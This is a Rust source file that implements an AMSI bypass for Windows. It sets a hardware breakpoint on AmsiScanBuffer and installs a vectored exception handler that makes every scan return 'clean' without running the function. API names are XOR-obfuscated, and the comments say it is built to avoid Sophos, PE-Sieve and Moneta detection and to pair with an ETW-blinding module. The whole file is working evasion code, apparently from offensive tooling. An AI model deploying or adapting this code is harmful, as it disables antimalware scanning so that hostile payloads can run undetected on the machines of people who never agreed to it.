// evasion.rs — AMSI bypass via hardware breakpoint
//
// Sets a hardware breakpoint (DR1) on AmsiScanBuffer and installs a
// Vectored Exception Handler.  When AmsiScanBuffer is called, the
// processor raises #DB before executing the first instruction.
// The VEH catches it, sets RAX = S_OK (0) and the scan result
// parameter to AMSI_RESULT_CLEAN (0), redirects RIP to the return
// address, and resumes — the function never executes.
//
// No bytes are modified in amsi.dll — Sophos AmsiRegistrationProtection
// sees no VirtualProtect calls on AMSI pages, PE-Sieve and Moneta see
// no function hooks or modified code.
//
// Uses DR1 (not DR0) so this can coexist with etw_hwbp which uses DR0.
//
// All API names XOR-obfuscated.  GetThreadContext / SetThreadContext /
// AddVectoredExceptionHandler resolved at runtime via GetProcAddress.

use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};

// ── Compile-time XOR obfuscation ─────────────────────────────────────────────

const KEY: u8 = 0x4E;

const fn obf<const N: usize>(s: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N { out[i] = s[i] ^ KEY; i += 1; }
    out
}

fn dec(enc: &[u8]) -> Vec<u8> { enc.iter().map(|&b| b ^ KEY).collect() }

const OBF_AMSI:     [u8; 9]  = obf(b"amsi.dll\0");
const OBF_K32:      [u8; 13] = obf(b"kernel32.dll\0");
const OBF_AMSI_FN:  [u8; 15] = obf(b"AmsiScanBuffer\0");
const OBF_ADD_VEH:  [u8; 28] = obf(b"AddVectoredExceptionHandler\0");
const OBF_GET_CTX:  [u8; 17] = obf(b"GetThreadContext\0");
const OBF_SET_CTX:  [u8; 17] = obf(b"SetThreadContext\0");
const OBF_CUR_THR:  [u8; 17] = obf(b"GetCurrentThread\0");

// ── AMD64 CONTEXT offsets ────────────────────────────────────────────────────

const CTX_SIZE:   usize = 0x4D0;
const OFF_FLAGS:  usize = 0x030;
const OFF_DR1:    usize = 0x050; // DR1 — DR0 is at 0x048, used by etw_hwbp
const OFF_DR7:    usize = 0x070;
const OFF_RAX:    usize = 0x078;
const OFF_RDX:    usize = 0x088; // 3rd param (result ptr) on x64: r8 → but we use stack
const OFF_R8:     usize = 0x0B8; // r8 = amsiResult ptr (6th param is result)
const OFF_RSP:    usize = 0x098;
const OFF_RIP:    usize = 0x0F8;

const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

// ── Global: AmsiScanBuffer address for VEH ───────────────────────────────────

static mut AMSI_ADDR: u64 = 0;

// ── VEH handler ──────────────────────────────────────────────────────────────
//
// AmsiScanBuffer signature:
//   HRESULT AmsiScanBuffer(
//     HAMSICONTEXT amsiContext,  // rcx
//     PVOID        buffer,       // rdx
//     ULONG        length,       // r8
//     LPCWSTR      contentName,  // r9
//     HAMSISESSION amsiSession,  // [rsp+0x28]
//     AMSI_RESULT  *result       // [rsp+0x30]
//   );
//
// We set *result = AMSI_RESULT_CLEAN (0) and return S_OK (0).

unsafe extern "system" fn amsi_veh(info: *mut c_void) -> i32 {
    let ptrs   = info as *const *const u8;
    let record = *ptrs;
    let ctx    = *ptrs.add(1) as *mut u8;

    let code = *(record as *const u32);
    let rip  = *(ctx.add(OFF_RIP) as *const u64);

    if code == 0x8000_0004 && rip == AMSI_ADDR {
        // Set return value S_OK
        *(ctx.add(OFF_RAX) as *mut u64) = 0;

        // Zero the AMSI_RESULT output parameter.
        // 6th parameter is at [rsp + 0x30] (shadow space 0x20 + 0x10 for 5th/6th params).
        let rsp = *(ctx.add(OFF_RSP) as *const u64);
        let result_ptr = *(((rsp + 0x30) as *const u64) as *const *mut u32);
        if !result_ptr.is_null() {
            *result_ptr = 0; // AMSI_RESULT_CLEAN
        }

        // Pop return address and resume
        *(ctx.add(OFF_RIP) as *mut u64) = *(rsp as *const u64);
        *(ctx.add(OFF_RSP) as *mut u64) = rsp + 8;

        return -1; // EXCEPTION_CONTINUE_EXECUTION
    }
    0 // EXCEPTION_CONTINUE_SEARCH
}

// ── Entry point ──────────────────────────────────────────────────────────────

pub fn evade() {
    unsafe { let _ = setup(); }
}

// ── Dynamic API types ────────────────────────────────────────────────────────

type FnAddVeh     = unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut c_void) -> i32) -> *mut c_void;
type FnGetCtx     = unsafe extern "system" fn(*mut c_void, *mut u8) -> i32;
type FnSetCtx     = unsafe extern "system" fn(*mut c_void, *const u8) -> i32;
type FnGetCurThr  = unsafe extern "system" fn() -> *mut c_void;

unsafe fn setup() -> windows::core::Result<()> {
    // ── Load amsi.dll and resolve AmsiScanBuffer ────────────────────────────
    let amsi_name = dec(&OBF_AMSI);
    let amsi_fn   = dec(&OBF_AMSI_FN);

    // LoadLibraryA to ensure amsi.dll is loaded (may not be yet pre-CLR)
    let h_amsi = LoadLibraryA(PCSTR(amsi_name.as_ptr()))?;
    let amsi_addr = GetProcAddress(h_amsi, PCSTR(amsi_fn.as_ptr()))
        .ok_or_else(windows::core::Error::from_win32)? as u64;

    AMSI_ADDR = amsi_addr;

    // ── Resolve kernel32 helpers ─────────────────────────────────────────────
    let k32_name = dec(&OBF_K32);
    let h_k32    = GetModuleHandleA(PCSTR(k32_name.as_ptr()))?;

    macro_rules! resolve {
        ($obf:expr, $ty:ty) => {{
            let n = dec(&$obf);
            std::mem::transmute::<_, $ty>(
                GetProcAddress(h_k32, PCSTR(n.as_ptr()))
                    .ok_or_else(windows::core::Error::from_win32)?,
            )
        }};
    }

    let add_veh:     FnAddVeh    = resolve!(OBF_ADD_VEH,  FnAddVeh);
    let get_ctx:     FnGetCtx    = resolve!(OBF_GET_CTX,  FnGetCtx);
    let set_ctx:     FnSetCtx    = resolve!(OBF_SET_CTX,  FnSetCtx);
    let get_cur_thr: FnGetCurThr = resolve!(OBF_CUR_THR,  FnGetCurThr);

    // ── Install VEH (first = 1 → called before any other handler) ────────────
    add_veh(1, amsi_veh);

    // ── Set DR1 hardware breakpoint on current thread ────────────────────────
    let thread = get_cur_thr();

    #[repr(C, align(16))]
    struct Ctx([u8; CTX_SIZE]);
    let mut ctx = Ctx([0u8; CTX_SIZE]);
    let p = ctx.0.as_mut_ptr();

    *(p.add(OFF_FLAGS) as *mut u32) = CONTEXT_DEBUG_REGISTERS;

    if get_ctx(thread, p) == 0 {
        return Ok(());
    }

    // DR1 = AmsiScanBuffer
    *(p.add(OFF_DR1) as *mut u64) = amsi_addr;

    // DR7: enable DR1 local breakpoint, execution, 1-byte length
    //   bit  2     : L1  = 1 (local enable DR1)
    //   bits 20-21 : R/W1 = 00 (break on execution)
    //   bits 22-23 : LEN1 = 00 (1 byte)
    let dr7 = *(p.add(OFF_DR7) as *const u64);
    *(p.add(OFF_DR7) as *mut u64) = (dr7 & !0x00F0_000C) | 0x0000_0004;

    set_ctx(thread, p);

    Ok(())
}
